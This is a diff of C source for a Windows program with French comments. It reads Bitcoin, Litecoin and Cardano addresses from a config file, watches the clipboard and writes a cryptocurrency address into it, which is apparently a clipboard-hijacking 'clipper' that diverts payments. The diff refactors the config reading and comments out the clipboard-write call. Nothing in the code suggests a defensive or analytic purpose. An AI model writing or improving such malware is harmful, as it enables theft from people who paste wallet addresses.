@@ -1,73 +1,11 @@
 #include <stdio.h>
+#include <string.h>
 #include <windows.h>
 
+#include "config_read.h"
+#include "crypto.h"
 #include "clipboard.h"
 #include "utils.h"
-#include "../lib/ini.h"
-
-#define ADDRESS_SIZE 256
-
-static wchar_t bitcoin_buffer[ADDRESS_SIZE];
-static wchar_t litecoin_buffer[ADDRESS_SIZE];
-static wchar_t cardano_buffer[ADDRESS_SIZE];
-
-static int handler(void *user, const char *section,
-                   const char *name, const char *value)
-{
-    (void)user;
-
-    if (strcmp(section, "General") != 0)
-        return 1;
-
-    wchar_t *destination = NULL;
-    size_t capacity = ADDRESS_SIZE;
-
-    if (strcmp(name, "bitcoin_address") == 0)
-        destination = bitcoin_buffer;
-    else if (strcmp(name, "litecoin_address") == 0)
-        destination = litecoin_buffer;
-    else if (strcmp(name, "cardano_address") == 0)
-        destination = cardano_buffer;
-
-    if (destination != NULL) {
-        size_t i = 0;
-
-        // Conversion ASCII vers wchar_t
-        while (value[i] != '\0' && i < capacity - 1) {
-            unsigned char c = (unsigned char)value[i];
-
-            if (c > 127)
-                return 0; // Refuser les caractères non ASCII
-
-            destination[i] = (wchar_t)c;
-            i++;
-        }
-
-        if (value[i] != '\0')
-            return 0; // Valeur trop longue
-
-        destination[i] = L'\0';
-    }
-
-    return 1;
-}
-
-int read_ini(const char *filename)
-{
-    int error = ini_parse(filename, handler, NULL);
-
-    if (error < 0) {
-        fprintf(stderr, "Impossible d'ouvrir %s\n", filename);
-        return 1;
-    }
-
-    if (error > 0) {
-        fprintf(stderr, "Erreur INI à la ligne %d\n", error);
-        return 1;
-    }
-
-    return 0;
-}
 
 StateCodeProcess main(void)
 {
@@ -90,10 +28,9 @@ StateCodeProcess main(void)
     wchar_t buffer[buffer_size];
 
     // Définition des adresses de cryptomonnaies
-    if (read_ini("../config/config.ini") != 0)
-        return 1;
+    if (config_read("../config/config.ini") != STATE_OK)
+        return STATE_ERROR;
 
-    // Les types sont conservés !
     const wchar_t *bitcoin_address = bitcoin_buffer;
     const wchar_t *litecoin_address = litecoin_buffer;
     const wchar_t *cardano_address = cardano_buffer;
@@ -202,9 +139,9 @@ StateCodeProcess main(void)
                     return STATE_ERROR;
                 }
 
-                if (setClipboardText(crypto_address, size_crypto_address) == STATE_WARNING) {
-                    printf("[WARNING] -- Some issues could occur during the execution.\n");
-                }
+                // if (setClipboardText(crypto_address, size_crypto_address) == STATE_WARNING) {
+                //     printf("[WARNING] -- Some issues could occur during the execution.\n");
+                // }
 
                 Sleep(500);
                 state = STATE_ANALYZE_CLIPBOARD;
